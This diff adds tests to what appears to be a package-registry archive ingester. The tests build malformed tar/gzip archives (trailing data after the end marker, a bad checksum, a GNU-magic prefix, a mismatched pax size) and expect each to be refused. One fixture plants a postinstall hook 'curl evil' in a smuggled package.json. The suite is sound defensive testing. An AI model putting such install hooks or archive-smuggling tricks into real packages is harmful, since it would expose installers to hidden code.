@@ -344,3 +344,126 @@ test('an identical archive always produces the same tree hash', async t => {
   t.is(first.treeHash, second.treeHash);
   t.not(first.tarballHash, second.tarballHash);
 });
+
+/**
+ * @param {Uint8Array} header
+ * @returns {Uint8Array}
+ */
+const resum = header => {
+  header.fill(0x20, 148, 156);
+  let checksum = 0;
+  for (const byte of header) checksum += byte;
+  header.fill(0, 148, 156);
+  header.set(
+    new TextEncoder().encode(`${checksum.toString(8).padStart(7, '0')}\0`),
+    148,
+  );
+  return header;
+};
+
+/**
+ * @param {string} archivePath
+ * @param {string} text
+ * @returns {Uint8Array[]}
+ */
+const fileBlocks = (archivePath, text) => {
+  const content = new TextEncoder().encode(text);
+  return [
+    tarFileHeader(archivePath, content.byteLength),
+    content,
+    tarFilePadding(content.byteLength),
+  ];
+};
+
+/** @param {Uint8Array[]} parts */
+const gzipParts = parts => new Uint8Array(gzipSync(Buffer.concat(parts)));
+
+const HARMLESS = JSON.stringify({ name: 'solo', version: '1.0.0' });
+const HARMFUL = JSON.stringify({
+  name: 'solo',
+  version: '1.0.0',
+  scripts: { postinstall: 'curl evil' },
+});
+
+test('a single zero block followed by another entry is refused', async t => {
+  await refused(
+    t,
+    ingest(
+      gzipParts([
+        ...fileBlocks('package/package.json', HARMLESS),
+        new Uint8Array(512),
+        ...fileBlocks('package/package.json', HARMFUL),
+        tarEndMarker(),
+      ]),
+    ),
+    400,
+    /data after its end-of-archive marker/,
+  );
+});
+
+test('trailing garbage after the end-of-archive marker is refused', async t => {
+  await refused(
+    t,
+    ingest(
+      gzipParts([
+        ...fileBlocks('package/package.json', HARMLESS),
+        tarEndMarker(),
+        new Uint8Array([1]),
+      ]),
+    ),
+    400,
+    /data after its end-of-archive marker/,
+  );
+});
+
+test('a header with a bad checksum is refused', async t => {
+  const [header, ...rest] = fileBlocks('package/package.json', HARMLESS);
+  header[0] += 1;
+  await refused(
+    t,
+    ingest(gzipParts([header, ...rest, tarEndMarker()])),
+    400,
+    /bad checksum/,
+  );
+});
+
+test('a prefix under GNU magic is refused', async t => {
+  const [header, ...rest] = fileBlocks('package.json', HARMLESS);
+  header.set(new TextEncoder().encode('package'), 345);
+  header.set(new TextEncoder().encode('ustar  \0'), 257);
+  await refused(
+    t,
+    ingest(gzipParts([resum(header), ...rest, tarEndMarker()])),
+    400,
+    /prefix without ustar magic/,
+  );
+});
+
+test('a prefix under POSIX ustar magic is accepted', async t => {
+  const [header, ...rest] = fileBlocks('package.json', HARMLESS);
+  header.set(new TextEncoder().encode('package'), 345);
+  const { paths } = await ingest(
+    gzipParts([resum(header), ...rest, tarEndMarker()]),
+  );
+  t.deepEqual(paths, ['package.json']);
+});
+
+test('a pax size that disagrees with its header is refused', async t => {
+  const record = '12 size=999\n';
+  const pax = tarFileHeader('PaxHeader', record.length);
+  pax[156] = 'x'.charCodeAt(0);
+  await refused(
+    t,
+    ingest(
+      gzipParts([
+        resum(pax),
+        new TextEncoder().encode(record),
+        tarFilePadding(record.length),
+        ...fileBlocks('package/package.json', HARMLESS),
+        tarEndMarker(),
+      ]),
+    ),
+    400,
+    /disagrees with its pax size/,
+  );
+});
